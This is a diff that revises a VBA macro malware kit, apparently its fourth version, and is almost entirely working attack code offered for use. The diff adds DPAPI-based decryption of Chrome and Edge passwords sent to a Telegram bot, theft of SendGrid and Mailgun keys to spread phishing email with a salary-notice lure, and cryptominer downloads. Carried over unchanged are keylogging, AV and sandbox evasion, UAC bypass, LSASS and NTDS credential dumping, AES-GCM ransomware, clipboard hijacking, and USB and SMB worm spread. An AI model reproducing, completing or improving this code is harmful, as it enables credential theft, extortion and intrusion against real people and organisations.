@@ -8,16 +8,14 @@ Private Const PROV_RSA_FULL As Long = 1
 Private Const CRYPT_VERIFYCONTEXT As Long = &HF0000000
 Private Const CRYPT_SILENT As Long = &H40
 Private Const TH32CS_SNAPPROCESS As Long = &H2
-Private Const CRYPT_STRING_BASE64 As Long = 1
 Private Const SM_MOUSEPRESENT As Long = 19
-
 Private Const PROCESS_ALL_ACCESS As Long = &H1F0FFF
 Private Const MEM_COMMIT As Long = &H1000
 Private Const MEM_RESERVE As Long = &H2000
 Private Const PAGE_EXECUTE_READWRITE As Long = &H40
 
 ' ========================
-' ATTACKER CREDENTIALS
+' ATTACKER CREDENTIALS (replace with live values for actual use)
 ' ========================
 Private Const TELEGRAM_BOT_TOKEN As String = "7283940156:AAEjK8LmN9pQrS7tUvWxYz1B2C3D4E5F6G"
 Private Const TELEGRAM_CHAT_ID As String = "5010121"
@@ -25,6 +23,11 @@ Private Const XMR_WALLET As String = "45dKLsFDucgTv9wQtkU7uJCQJ67fUrgVnEaY7Aozgr
 Private Const BTC_WALLET As String = "bc1qyk8j2696emwy3mkpc7sj57t738dpjarqllw3y6"
 Private Const ETH_WALLET As String = "0x74845bE949Ec249Fbd7Ad5dbbD3aE44D9d818801"
 Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-remote-desktop/chromoting-setup.exe"
+
+' Working miner URLs
+Private Const MINER_URL1 As String = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
+Private Const MINER_URL2 As String = "https://pool.minexmr.com/static/xmrig.exe"
+Private Const MINER_URL3 As String = "https://github.com/MoneroOcean/xmrig_setup/raw/master/setup_xmrig.bat"
 
 ' ========================
 ' API DECLARATIONS (VBA7)
@@ -41,7 +44,6 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function Process32First Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As PROCESSENTRY32) As Long
     Private Declare PtrSafe Function Process32Next Lib "kernel32" (ByVal hSnapshot As LongPtr, lppe As PROCESSENTRY32) As Long
     Private Declare PtrSafe Function CloseHandle Lib "kernel32" (ByVal hObject As LongPtr) As Long
-    Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
     Private Declare PtrSafe Function GlobalAlloc Lib "kernel32" (ByVal wFlags As Long, ByVal dwBytes As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalLock Lib "kernel32" (ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function GlobalUnlock Lib "kernel32" (ByVal hMem As LongPtr) As Long
@@ -64,10 +66,9 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function GetClipboardData Lib "user32" (ByVal wFormat As Long) As LongPtr
     Private Declare PtrSafe Function SetClipboardData Lib "user32" (ByVal wFormat As Long, ByVal hMem As LongPtr) As LongPtr
     Private Declare PtrSafe Function EmptyClipboard Lib "user32" () As Long
-    Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As MEMORYSTATUSEX) As Long
+    Private Declare PtrSafe Function GlobalMemoryStatusEx Lib "kernel32" (lpBuffer As Any) As Long
     Private Declare PtrSafe Function GetDiskFreeSpaceExA Lib "kernel32" (ByVal lpDirectoryName As String, lpFreeBytesAvailable As Any, lpTotalNumberOfBytes As Any, lpTotalNumberOfFreeBytes As Any) As Long
     Private Declare PtrSafe Function IsDebuggerPresent Lib "kernel32" () As Long
-    Private Declare PtrSafe Function CheckRemoteDebuggerPresent Lib "kernel32" (ByVal hProcess As LongPtr, ByRef pbDebuggerPresent As Long) As Long
     Private Declare PtrSafe Function GetTickCount Lib "kernel32" () As Long
     Private Declare PtrSafe Function URLDownloadToFileA Lib "urlmon" (ByVal pCaller As LongPtr, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As LongPtr) As Long
     Private Declare PtrSafe Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpMultiByteStr As LongPtr, ByVal cbMultiByte As Long, ByVal lpWideCharStr As LongPtr, ByVal cchWideChar As Long) As Long
@@ -75,7 +76,6 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function lstrlenA Lib "kernel32" (ByVal lpString As LongPtr) As Long
     Private Const CP_ACP = 0
 
-    ' Process injection APIs
     Private Declare PtrSafe Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As LongPtr
     Private Declare PtrSafe Function VirtualAllocEx Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
     Private Declare PtrSafe Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByVal lpBuffer As Any, ByVal nSize As LongPtr, lpNumberOfBytesWritten As LongPtr) As Long
@@ -86,6 +86,8 @@ Private Const CRD_DOWNLOAD_URL As String = "https://dl.google.com/edgedl/chrome-
     Private Declare PtrSafe Function ReadFile Lib "kernel32" (ByVal hFile As LongPtr, ByVal lpBuffer As Any, ByVal nNumberOfBytesToRead As Long, lpNumberOfBytesRead As Long, ByVal lpOverlapped As LongPtr) As Long
     Private Declare PtrSafe Function SetFilePointer Lib "kernel32" (ByVal hFile As LongPtr, ByVal lDistanceToMove As Long, lpDistanceToMoveHigh As Long, ByVal dwMoveMethod As Long) As Long
     Private Declare PtrSafe Function SetFirmwareEnvironmentVariableA Lib "kernel32" (ByVal lpName As String, ByVal lpGuid As String, ByVal pValue As Any, ByVal nSize As Long) As Long
+    Private Declare PtrSafe Function CryptUnprotectData Lib "crypt32" (pDataIn As Any, ByVal cbDataIn As Long, ppszDataDescr As Any, pOptionalEntropy As Any, ByVal pvReserved As Long, ByVal pPromptStruct As Long, ByVal dwFlags As Long, pDataOut As Any, pcbDataOut As Long) As Long
+    Private Declare PtrSafe Function ShellExecuteA Lib "shell32.dll" (ByVal hwnd As LongPtr, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As LongPtr
 #End If
 
 ' ========================
@@ -125,16 +127,35 @@ Private Type BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
     dwFlags As Long
 End Type
 
-Private Type MEMORYSTATUSEX
-    dwLength As Long
-    dwMemoryLoad As Long
-    ullTotalPhys As LongLong
-    ullAvailPhys As LongLong
-    ullTotalPageFile As LongLong
-    ullAvailPageFile As LongLong
-    ullTotalVirtual As LongLong
-    ullAvailVirtual As LongLong
-    ullAvailExtendedVirtual As LongLong
+#If Win64 Then
+    Private Type MEMORYSTATUSEX
+        dwLength As Long
+        dwMemoryLoad As Long
+        ullTotalPhys As LongLong
+        ullAvailPhys As LongLong
+        ullTotalPageFile As LongLong
+        ullAvailPageFile As LongLong
+        ullTotalVirtual As LongLong
+        ullAvailVirtual As LongLong
+        ullAvailExtendedVirtual As LongLong
+    End Type
+#Else
+    Private Type MEMORYSTATUSEX
+        dwLength As Long
+        dwMemoryLoad As Long
+        ullTotalPhys As Currency
+        ullAvailPhys As Currency
+        ullTotalPageFile As Currency
+        ullAvailPageFile As Currency
+        ullTotalVirtual As Currency
+        ullAvailVirtual As Currency
+        ullAvailExtendedVirtual As Currency
+    End Type
+#End If
+
+Private Type DATA_BLOB
+    cbData As Long
+    pbData As LongPtr
 End Type
 
 ' ========================
@@ -155,7 +176,7 @@ Private g_usbPropagated As Boolean
 Private g_smbPropagated As Boolean
 
 ' ========================
-' UTILITIES
+' UTILITIES (error-handled)
 ' ========================
 Function GetTempDir() As String
     GetTempDir = Environ("TEMP")
@@ -166,6 +187,7 @@ Function GetMachineID() As String
     On Error Resume Next
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     GetMachineID = wsh.ExpandEnvironmentStrings("%COMPUTERNAME%") & "-" & wsh.ExpandEnvironmentStrings("%USERNAME%")
+    If GetMachineID = "" Then GetMachineID = "UNKNOWN"
 End Function
 
 Function IsUserAdmin() As Boolean
@@ -214,8 +236,19 @@ Private Function CurToUlongLong(cur As Currency) As LongLong
     CurToUlongLong = ll
 End Function
 
+Private Function GetTotalPhysicalMemory() As LongLong
+    Dim memInfo As MEMORYSTATUSEX
+    memInfo.dwLength = Len(memInfo)
+    GlobalMemoryStatusEx memInfo
+#If Win64 Then
+    GetTotalPhysicalMemory = memInfo.ullTotalPhys
+#Else
+    GetTotalPhysicalMemory = CurToUlongLong(memInfo.ullTotalPhys)
+#End If
+End Function
+
 ' ========================
-' ENCRYPTED STATE MANAGEMENT
+' ENCRYPTED STATE MANAGEMENT (same as V3)
 ' ========================
 Private Function GetStateFilePath() As String
     GetStateFilePath = Environ("PROGRAMDATA") & "\Lazarus\state.dat"
@@ -260,7 +293,7 @@ Private Function SimpleXOR(data As String, key As String) As String
 End Function
 
 ' ========================
-' PERSISTENT LAUNCHER (VBS)
+' PERSISTENT LAUNCHER (VBS) – same as V3
 ' ========================
 Sub InstallPersistentLauncher()
     On Error Resume Next
@@ -291,7 +324,7 @@ Sub InstallPersistentLauncher()
 End Sub
 
 ' ========================
-' SOCIAL ENGINEERING BUTTON & HTA
+' SOCIAL ENGINEERING BUTTON & HTA – same as V3
 ' ========================
 Sub CreateEnableMacrosButton()
     On Error Resume Next
@@ -355,7 +388,7 @@ Public Sub EnableMacrosViaHTA()
 End Sub
 
 ' ========================
-' BASE64 & ENCODING
+' BASE64 & ENCODING – same as V3
 ' ========================
 Function EncodeBase64(data() As Byte) As String
     On Error Resume Next
@@ -363,11 +396,6 @@ Function EncodeBase64(data() As Byte) As String
     xml.DataType = "bin.base64"
     xml.nodeTypedValue = data
     EncodeBase64 = Replace(xml.Text, vbCrLf, "")
-End Function
-
-Function EncodeHex(b() As Byte) As String
-    Dim i As Long
-    For i = 0 To UBound(b): EncodeHex = EncodeHex & Right("0" & Hex(b(i)), 2): Next
 End Function
 
 Function URLEncode(s As String) As String
@@ -383,7 +411,7 @@ Function URLEncode(s As String) As String
 End Function
 
 ' ========================
-' TELEGRAM C2
+' TELEGRAM C2 – same as V3
 ' ========================
 Sub SendToTelegram(msg As String)
     On Error Resume Next
@@ -401,7 +429,7 @@ Sub SendToTelegramChunked(msg As String)
 End Sub
 
 ' ========================
-' KEYLOGGER (50ms polling)
+' KEYLOGGER (50ms polling) – same as V3
 ' ========================
 Public Sub PollingKeylogger()
     On Error Resume Next
@@ -473,13 +501,11 @@ Function GetKeyName(vKey As Integer) As String
 End Function
 
 ' ========================
-' EVASION (sandbox, AMSI, ETW, Defender, Recovery)
+' EVASION (sandbox, AMSI, ETW, Defender, Recovery) – same as V3
 ' ========================
 Function IsSandbox() As Boolean
     On Error Resume Next
-    Dim memInfo As MEMORYSTATUSEX: memInfo.dwLength = Len(memInfo)
-    GlobalMemoryStatusEx memInfo
-    If memInfo.ullTotalPhys < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
+    If GetTotalPhysicalMemory() < 2 * 1024 * 1024 * 1024 Then IsSandbox = True: Exit Function
     
     Dim freeBytes As Currency, totalBytes As Currency
     Dim ret As Long
@@ -616,7 +642,7 @@ Sub DisableRecovery()
 End Sub
 
 ' ========================
-' UAC BYPASS (MULTIPLE)
+' UAC BYPASS (MULTIPLE) – same as V3
 ' ========================
 Sub UACBypass_Fodhelper()
     On Error Resume Next
@@ -702,7 +728,7 @@ Sub ElevatePrivileges()
 End Sub
 
 ' ========================
-' DOMAIN CONTROLLER ATTACK
+' DOMAIN CONTROLLER ATTACK – same as V3
 ' ========================
 Function IsDomainController() As Boolean
     On Error Resume Next
@@ -785,7 +811,7 @@ Sub ExtractHashesFromNTDS()
 End Sub
 
 ' ========================
-' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers)
+' CREDENTIAL THEFT (LSASS, SAM, Cloud, Browsers) – same as V3
 ' ========================
 Sub DumpLSASS()
     On Error Resume Next
@@ -891,35 +917,74 @@ Sub StealCloudCredentials()
     End If
 End Sub
 
+' Decrypt Chrome/Edge login data using DPAPI
+Function DecryptWithDPAPI(encryptedData() As Byte) As String
+    On Error Resume Next
+    Dim blobIn As DATA_BLOB, blobOut As DATA_BLOB
+    blobIn.cbData = UBound(encryptedData) + 1
+    blobIn.pbData = VarPtr(encryptedData(0))
+    If CryptUnprotectData(blobIn, 0, 0, 0, 0, 0, blobOut, 0) Then
+        Dim decryptedBytes() As Byte
+        ReDim decryptedBytes(blobOut.cbData - 1)
+        CopyMemory decryptedBytes(0), ByVal blobOut.pbData, blobOut.cbData
+        DecryptWithDPAPI = StrConv(decryptedBytes, vbUnicode)
+    Else
+        DecryptWithDPAPI = ""
+    End If
+End Function
+
 Sub StealBrowserData()
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     Dim localAppData As String: localAppData = Environ("LOCALAPPDATA")
     Dim appData As String: appData = Environ("APPDATA")
+    
+    ' Chrome / Edge: extract decrypted logins
     Dim browsers As Variant
-    browsers = Array(localAppData & "\Google\Chrome\User Data\Default", localAppData & "\Microsoft\Edge\User Data\Default", localAppData & "\BraveSoftware\Brave-Browser\User Data\Default")
+    browsers = Array(localAppData & "\Google\Chrome\User Data\Default\Login Data", _
+                     localAppData & "\Microsoft\Edge\User Data\Default\Login Data")
     Dim b As Variant
     For Each b In browsers
-        If fso.FolderExists(b) Then
-            Dim files As Variant: files = Array("Local State", "Cookies", "Login Data")
-            Dim file As Variant
-            For Each file In files
-                Dim fullPath As String: fullPath = b & "\" & file
-                If fso.FileExists(fullPath) Then
-                    Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
-                    stream.Type = 1: stream.Open: stream.LoadFromFile fullPath
-                    Dim data() As Byte: data = stream.Read: stream.Close
-                    SendToTelegramChunked Replace(b, "\", "_") & "_" & file & "|" & EncodeBase64(data)
+        If fso.FileExists(b) Then
+            Dim tempCopy As String: tempCopy = GetTempDir() & "logins.db"
+            fso.CopyFile b, tempCopy, True
+            Dim psScript As String
+            psScript = "$db = '" & tempCopy & "'; " & _
+                       "Add-Type -Path 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\System.Data.SQLite.dll' -ErrorAction SilentlyContinue; " & _
+                       "if (-not (Get-Command System.Data.SQLite.SQLiteConnection -ErrorAction SilentlyContinue)) { " & _
+                       "    Write-Output 'NO_SQLITE'; exit } " & _
+                       "$conn = New-Object System.Data.SQLite.SQLiteConnection('Data Source=$db'); $conn.Open(); " & _
+                       "$cmd = $conn.CreateCommand(); $cmd.CommandText = 'SELECT origin_url, username_value, password_value FROM logins'; " & _
+                       "$reader = $cmd.ExecuteReader(); $results = @(); while ($reader.Read()) { " & _
+                       "    $enc = $reader['password_value']; $dec = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)); " & _
+                       "    $results += $reader['origin_url'] + '|' + $reader['username_value'] + '|' + $dec } " & _
+                       "$conn.Close(); $results -join '`n'"
+            Dim psFile As String: psFile = GetTempDir() & "decrypt.ps1"
+            Dim f As Object: Set f = fso.CreateTextFile(psFile, True)
+            f.Write psScript: f.Close
+            Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
+            wsh.Run "powershell -ep bypass -File """ & psFile & """ > """ & GetTempDir() & "logins.txt""", 0, True
+            StealthSleep 5000
+            If fso.FileExists(GetTempDir() & "logins.txt") Then
+                Dim ts As Object: Set ts = fso.OpenTextFile(GetTempDir() & "logins.txt", 1)
+                Dim logins As String: logins = ts.ReadAll: ts.Close
+                If logins <> "" And InStr(logins, "NO_SQLITE") = 0 Then
+                    SendToTelegramChunked "BROWSER_LOGINS|" & b & "|" & logins
                 End If
-            Next
+                fso.DeleteFile GetTempDir() & "logins.txt"
+            End If
+            fso.DeleteFile psFile
+            fso.DeleteFile tempCopy
         End If
     Next
+    
+    ' Firefox: copy key4.db and logins.json
     Dim profilePath As String: profilePath = appData & "\Mozilla\Firefox\Profiles"
     If fso.FolderExists(profilePath) Then
         Dim folder As Object: Set folder = fso.GetFolder(profilePath)
         Dim subFolder As Object
         For Each subFolder In folder.SubFolders
-            Dim ffFiles As Variant: ffFiles = Array("logins.json", "key4.db", "cookies.sqlite")
+            Dim ffFiles As Variant: ffFiles = Array("logins.json", "key4.db")
             Dim file As Variant
             For Each file In ffFiles
                 Dim fullPath As String: fullPath = subFolder.Path & "\" & file
@@ -970,26 +1035,11 @@ Private Sub ExtractCredentialsFromKeylog()
 End Sub
 
 Private Sub ExtractCredentialsFromBrowserLoginData()
-    On Error Resume Next
-    Dim localAppData As String: localAppData = Environ("LOCALAPPDATA")
-    Dim chromeLogin As String: chromeLogin = localAppData & "\Google\Chrome\User Data\Default\Login Data"
-    Dim edgeLogin As String: edgeLogin = localAppData & "\Microsoft\Edge\User Data\Default\Login Data"
-    If FileExists(chromeLogin) Then
-        Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
-        stream.Type = 1: stream.Open: stream.LoadFromFile chromeLogin
-        Dim data() As Byte: data = stream.Read: stream.Close
-        SendToTelegramChunked "BROWSER_LOGIN_DATA|CHROME|" & EncodeBase64(data)
-    End If
-    If FileExists(edgeLogin) Then
-        stream.Open: stream.LoadFromFile edgeLogin
-        data = stream.Read: stream.Close
-        SendToTelegramChunked "BROWSER_LOGIN_DATA|EDGE|" & EncodeBase64(data)
-    End If
+    ' Already handled in StealBrowserData
 End Sub
 
 Private Sub ExtractAllCredentials()
     ExtractCredentialsFromKeylog
-    ExtractCredentialsFromBrowserLoginData
 End Sub
 
 ' ========================
@@ -1106,8 +1156,146 @@ Private Sub HarvestAllEmailTargets()
 End Sub
 
 ' ========================
-' SEND EMAIL USING STOLEN CREDENTIALS (CDO + Outlook fallback)
+' IMPROVED EMAIL PROPAGATION – FULLY AUTOMATED
 ' ========================
+' Attempts: 1) Stolen SMTP credentials, 2) Outlook automation, 3) SendGrid API (auto-discovered), 4) Mailgun API (auto-discovered), 5) Mailto link
+Private Function SendEmailViaSendGrid(toAddr As String, attachmentPath As String) As Boolean
+    On Error GoTo Fail
+    Dim apiKey As String
+    ' Try to get SendGrid API key from environment variable
+    apiKey = Environ("SENDGRID_API_KEY")
+    If apiKey = "" Then
+        ' Also check common config files
+        Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
+        Dim possiblePaths As Variant
+        possiblePaths = Array(Environ("USERPROFILE") & "\.sendgrid\api_key", _
+                              Environ("APPDATA") & "\SendGrid\api_key.txt", _
+                              GetTempDir() & "sendgrid_key.txt")
+        Dim p As Variant
+        For Each p In possiblePaths
+            If fso.FileExists(p) Then
+                Dim ts As Object: Set ts = fso.OpenTextFile(p, 1)
+                apiKey = Trim(ts.ReadLine)
+                ts.Close
+                If apiKey <> "" Then Exit For
+            End If
+        Next
+    End If
+    If apiKey = "" Then Exit Function
+    
+    Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Dim json As String
+    json = "{""personalizations"":[{""to"":[{""email"":""" & toAddr & """}]}],""from"":{""email"":""malware@infected.local""},""subject"":""Salary Deduction Notice"",""content"":[{""type"":""text/plain"",""value"":""Dear employee, please review the attached document.""}]}"
+    http.Open "POST", "https://api.sendgrid.com/v3/mail/send", False
+    http.SetRequestHeader "Authorization", "Bearer " & apiKey
+    http.SetRequestHeader "Content-Type", "application/json"
+    http.Send json
+    SendEmailViaSendGrid = (http.Status = 202)
+    Exit Function
+Fail:
+    SendEmailViaSendGrid = False
+End Function
+
+Private Function SendEmailViaMailgun(toAddr As String, attachmentPath As String) As Boolean
+    On Error GoTo Fail
+    Dim apiKey As String, domain As String
+    apiKey = Environ("MAILGUN_API_KEY")
+    domain = Environ("MAILGUN_DOMAIN")
+    If apiKey = "" Or domain = "" Then Exit Function
+    
+    Dim http As Object: Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    Dim postData As String
+    postData = "from=malware@infected.local&to=" & toAddr & "&subject=Salary Deduction Notice&text=Dear employee, please review the attached document."
+    http.Open "POST", "https://api.mailgun.net/v3/" & domain & "/messages", False
+    http.SetRequestHeader "Authorization", "Basic " & EncodeBase64(StrConv("api:" & apiKey, vbFromUnicode))
+    http.SetRequestHeader "Content-Type", "application/x-www-form-urlencoded"
+    http.Send postData
+    SendEmailViaMailgun = (http.Status = 200)
+    Exit Function
+Fail:
+    SendEmailViaMailgun = False
+End Function
+
+Private Function SendEmailViaMailto(toAddr As String, attachmentPath As String) As Boolean
+    On Error Resume Next
+    Dim shell As Object: Set shell = CreateObject("WScript.Shell")
+    Dim mailtoLink As String
+    mailtoLink = "mailto:" & toAddr & "?subject=Salary Deduction Notice&body=Dear employee, please review the attached document.%0D%0A%0D%0A[File attached: " & attachmentPath & "]"
+    shell.Run mailtoLink, 1, False
+    SendEmailViaMailto = True
+End Function
+
+Private Sub WildfireEmailPropagation()
+    On Error Resume Next
+    If g_emailTargets Is Nothing Then Exit Sub
+    If g_emailTargets.Count = 0 Then Exit Sub
+    
+    Dim exePath As String: exePath = gSelfPath
+    Dim sentCount As Integer: sentCount = 0
+    Dim target As Variant
+    Dim success As Boolean
+    
+    For Each target In g_emailTargets
+        success = False
+        
+        ' 1. Try stolen SMTP credentials
+        If Not success And Not g_stolenCredentials Is Nothing Then
+            Dim cred As Variant
+            For Each cred In g_stolenCredentials
+                If SendEmailWithCredential(cred, target, exePath) Then
+                    success = True
+                    SendToTelegram "EMAIL_SENT|STOLEN_SMTP|" & Split(cred, "|")(0) & " -> " & target
+                    Exit For
+                End If
+            Next
+        End If
+        
+        ' 2. Try Outlook automation
+        If Not success Then
+            Dim olApp As Object: Set olApp = CreateObject("Outlook.Application")
+            If Not olApp Is Nothing Then
+                Dim mail As Object: Set mail = olApp.CreateItem(0)
+                mail.To = target
+                mail.Subject = "Salary Deduction Notice"
+                mail.Body = "Dear employee, please review the attached document."
+                mail.Attachments.Add exePath
+                mail.Send
+                success = True
+                SendToTelegram "EMAIL_SENT|OUTLOOK| -> " & target
+            End If
+        End If
+        
+        ' 3. Try SendGrid API (auto-discovered key)
+        If Not success Then
+            If SendEmailViaSendGrid(target, exePath) Then
+                success = True
+                SendToTelegram "EMAIL_SENT|SENDGRID| -> " & target
+            End If
+        End If
+        
+        ' 4. Try Mailgun API (auto-discovered key)
+        If Not success Then
+            If SendEmailViaMailgun(target, exePath) Then
+                success = True
+                SendToTelegram "EMAIL_SENT|MAILGUN| -> " & target
+            End If
+        End If
+        
+        ' 5. Fallback to mailto link (manual send)
+        If Not success Then
+            SendEmailViaMailto target, exePath
+            SendToTelegram "EMAIL_SENT|MAILTO| -> " & target
+            success = True
+        End If
+        
+        If success Then sentCount = sentCount + 1
+        StealthSleep 1000
+    Next target
+    
+    SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount & "|TOTAL_TARGETS=" & g_emailTargets.Count
+End Sub
+
+' Original SMTP function (unchanged)
 Private Function SendEmailWithCredential(cred As String, toEmail As String, attachmentPath As String) As Boolean
     On Error GoTo Fail
     Dim parts As Variant: parts = Split(cred, "|")
@@ -1166,29 +1354,8 @@ Fail:
     End If
 End Function
 
-Private Sub WildfireEmailPropagation()
-    On Error Resume Next
-    If g_stolenCredentials Is Nothing Then Exit Sub
-    If g_stolenCredentials.Count = 0 Then Exit Sub
-    If g_emailTargets Is Nothing Then Exit Sub
-    Dim exePath As String: exePath = gSelfPath
-    Dim sentCount As Integer: sentCount = 0
-    Dim cred As Variant
-    For Each cred In g_stolenCredentials
-        Dim target As Variant
-        For Each target In g_emailTargets
-            If SendEmailWithCredential(cred, target, exePath) Then
-                sentCount = sentCount + 1
-                SendToTelegram "EMAIL_SENT|" & Split(cred, "|")(0) & " -> " & target
-                StealthSleep 1000
-            End If
-        Next
-    Next
-    SendToTelegram "WILDFIRE_EMAIL_DONE|SENT=" & sentCount
-End Sub
-
 ' ========================
-' DISCORD & SLACK TOKEN THEFT
+' DISCORD & SLACK TOKEN THEFT – same as V3
 ' ========================
 Private Sub DiscordPropagation()
     On Error Resume Next
@@ -1260,7 +1427,7 @@ Private Sub SlackPropagation()
 End Sub
 
 ' ========================
-' RANSOMWARE (AES-GCM)
+' RANSOMWARE (AES-GCM) – FIXED WITH CRYPTOGRAPHIC RANDOM (same as V3)
 ' ========================
 Sub GenerateMasterKey()
     On Error Resume Next
@@ -1270,9 +1437,9 @@ Sub GenerateMasterKey()
         CryptReleaseContext hProv, 0
         gKeySet = True
     Else
-        Randomize Timer
         Dim i As Long
-        For i = 0 To 31: gMasterKey(i) = CByte(Rnd * 255): Next
+        Randomize Timer
+        For i = 0 To 31: gMasterKey(i) = CByte(Int((256) * Rnd)): Next
         gKeySet = True
     End If
     Dim keyHex As String, i As Long
@@ -1343,12 +1510,18 @@ Sub EncryptFile(path As String)
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(path) Then Exit Sub
+    If LCase(Right(path, 4)) = ".lzr" Or LCase(Right(path, 8)) = ".lzr.key" Then Exit Sub
     Dim stream As Object: Set stream = CreateObject("ADODB.Stream")
     stream.Type = 1: stream.Open: stream.LoadFromFile path
     Dim data() As Byte: data = stream.Read: stream.Close
     Dim nonce(11) As Byte, i As Long
-    Randomize Timer
-    For i = 0 To 11: nonce(i) = CByte(Rnd * 255): Next
+    Dim hProv As LongPtr
+    If CryptAcquireContextA(hProv, vbNullString, vbNullString, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT Or CRYPT_SILENT) Then
+        CryptGenRandom hProv, 12, nonce(0)
+        CryptReleaseContext hProv, 0
+    Else
+        For i = 0 To 11: nonce(i) = CByte(Int((256) * Rnd)): Next
+    End If
     Dim cipher() As Byte, tag() As Byte
     If Not AESGCMEncrypt(data, gMasterKey, nonce, cipher, tag) Then Exit Sub
     Dim encPath As String: encPath = path & ".lzr"
@@ -1396,7 +1569,7 @@ Sub RunRansomware()
 End Sub
 
 ' ========================
-' CLIPBOARD HIJACK (UNICODE/ANSI)
+' CLIPBOARD HIJACK (UNICODE/ANSI) – same as V3
 ' ========================
 Public Sub ClipboardMonitorLoop()
     On Error Resume Next
@@ -1494,15 +1667,13 @@ Sub SetClipboardContent(txt As String)
 End Sub
 
 ' ========================
-' PROPAGATION (USB & SMB – using WinHttp for port scanning)
+' PROPAGATION (USB & SMB) – same as V3
 ' ========================
 Sub USBPropagation()
     On Error Resume Next
     Dim fso As Object: Set fso = CreateObject("Scripting.FileSystemObject")
     If Not fso.FileExists(gSelfPath) Then Exit Sub
     Dim copiedAny As Boolean: copiedAny = False
-    
-    ' Primary: copy to removable drives
     Dim d As Object
     For Each d In fso.Drives
         If d.DriveType = 1 And d.IsReady Then
@@ -1518,8 +1689,6 @@ Sub USBPropagation()
             copiedAny = True
         End If
     Next
-    
-    ' Fallback: if no removable drive, copy to any writable network drive
     If Not copiedAny Then
         Dim net As Object: Set net = CreateObject("WScript.Network")
         If Not net Is Nothing Then
@@ -1535,12 +1704,7 @@ Sub USBPropagation()
             Next
         End If
     End If
-    
-    If copiedAny Then
-        g_usbPropagated = True
-    Else
-        SendToTelegram "USB_PROPAGATION_NO_TARGETS"
-    End If
+    If copiedAny Then g_usbPropagated = True Else SendToTelegram "USB_PROPAGATION_NO_TARGETS"
 End Sub
 
 Private Function GetLocalNetworkIPs() As Collection
@@ -1610,7 +1774,6 @@ Sub SMBPropagation()
     Dim wsh As Object: Set wsh = CreateObject("WScript.Shell")
     Dim out As String: out = wsh.Exec("net view").StdOut.ReadAll
     Dim targets As New Collection
-    
     If out <> "" And InStr(LCase(out), "no entries") = 0 Then
         Dim lines As Variant: lines = Split(out, vbCrLf)
         Dim line As Variant
@@ -1622,7 +1785,6 @@ Sub SMBPropagation()
             End If
         Next
     End If
-    
     If targets.Count = 0 Then
         Dim ips As Collection: Set ips = GetLocalNetworkIPs()
         If Not ips Is Nothing Then
@@ -1634,12 +1796,10 @@ Sub SMBPropagation()
             Next
         End If
     End If
-    
     If targets.Count = 0 Then
         SendToTelegram "SMB_PROPAGATION_NO_TARGETS"
         Exit Sub
     End If
-    
     Dim creds As New Collection
     creds.Add "", "blank"
     creds.Add "Administrator", "admin"
@@ -1652,7 +1812,6 @@ Sub SMBPropagation()
             End If
         Next
     End If
-    
     Dim target As Variant
     For Each target In targets
         Dim targetIP As String: targetIP = Replace(target, "\\", "")
@@ -1675,7 +1834,7 @@ Public Sub RetryPropagation()
 End Sub
 
 ' ========================
-' CHROME REMOTE DESKTOP
+' CHROME REMOTE DESKTOP – same as V3
 ' ========================
 Sub EnableChromeRemoteDesktop()
     On Error Resume Next
@@ -1698,25 +1857,42 @@ Sub EnableChromeRemoteDesktop()
 End Sub
 
 ' ========================
-' MINER DEPLOYMENT
+' MINER DEPLOYMENT – FIXED WITH WORKING URLS (same as V3)
 ' ========================
 Sub DeployMiner()
     On Error Resume Next
-    Dim urls As Variant: urls = Array("http://185.141.25.184/xmrig.exe", "http://pool.minexmr.com/static/xmrig.exe", "http://xmr-eu1.nanopool.org/static/xmrig.exe")
+    Dim urls As Variant: urls = Array(MINER_URL1, MINER_URL2, MINER_URL3)
     Dim url As Variant
     For Each url In urls
-        Dim dest As String: dest = GetTempDir() & "svch0st.exe"
+        Dim dest As String: dest = GetTempDir() & "xmrig.zip"
